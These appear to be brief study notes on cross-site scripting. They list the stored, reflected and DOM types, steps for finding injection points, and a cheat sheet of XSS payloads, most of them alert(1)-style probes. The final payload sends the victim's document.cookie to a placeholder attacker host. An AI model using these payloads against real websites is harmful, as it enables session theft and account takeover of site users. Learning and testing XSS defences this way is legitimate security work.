
### XSS 
Types of XSS
 - Stored: saving xss as like a comment in a dba
 - Reflected: causing css through a url, like a flash
 - DOM: input from use is stored in dom, similar to reflected by using like the location (hash #) portion to exploit
 
Process to detect
 1. Figure out where it goes, Does it get embedded in a tag or a string in a script? 
 2. Special handling.  Url turned into links?
 3. How are special characters handle "<>;:'`
 
Good scripts to try
 - `"><h1>test</h1>` - will show up well on the page
 - '+alert(1)+'
 - "onmouseover="alert(1)
 - http://"onmouseover="alert(1)
 - hello <a name="n" href="javascript:alert('xss')">*you*</a>
 - '><img src=x onerror=alert(1);> or <img src=x onerror=alertHello!> or <b onclick=alert(1)>click me!
 - "><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>
